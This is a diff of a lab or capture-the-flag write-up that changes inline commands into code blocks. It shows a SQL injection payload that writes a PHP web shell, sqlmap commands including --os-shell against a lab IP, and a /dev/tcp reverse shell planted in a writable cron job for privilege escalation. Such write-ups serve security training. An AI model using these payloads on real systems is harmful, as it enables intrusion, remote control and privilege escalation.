@@ -24,14 +24,25 @@ I ran it through Hash Identifier, and it’s bcrypt. I tried cracking it with Ha
 `' union select 1,<?php system($_GET['cmd']);?>,3,4,5,6,7 into outfile "/var/www/html/includes/x.php #`
 ![shell 1 image](../images/lion/shell1.webp)
 
-Alright, we have a PHP shell. However, to save time, I’ll list the SQLMap commands below. Using SQLMap, we can run: `python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste"`
+Alright, we have a PHP shell. However, to save time, I’ll list the SQLMap commands below. Using SQLMap, we can run: 
+```bash
+python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste"
+```
 ![sqlmap 1 image](../images/lion/sqlmap1.webp)
 
-Listing the databases and the current database: `python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --dbs --hex` and `python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --current-db --hex`
+Listing the databases and the current database: 
+```bash
+python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --dbs --hex
+``` 
+```bash
+python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --current-db --hex
+```
 
 As we observed manually, the admin password is hashed. Therefore, to upload a shell via SQLMap, we can use the following parameter: `--os-shell`. This option allows SQLMap to attempt to spawn an operating system shell on the target system if the SQL injection is successful.
 
-`python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --os-shell`
+```bash
+python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --os-shell
+```
 
 Now, we can get shell and reverse shell with python.
 <br>
@@ -54,7 +65,9 @@ There appears to be a logrotate version 3.8.6, which may be vulnerable. If our a
 ![pos 4 image](../images/lion/pos4.webp)
 
 Going back to the cron job, since we have write permissions on the file, we can modify it and apply the payload. After making the changes, we just need to wait for the cron job to execute and gain privilege escalation.
-`/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'`
+```bash
+/bin/bash -c 'sh -i >& /dev/tcp/ip/porta 0>&1'
+```
 <br>
 ![pos 5 image](../images/lion/pos5.webp)
 ![pos 6 image](../images/lion/pos6.webp)
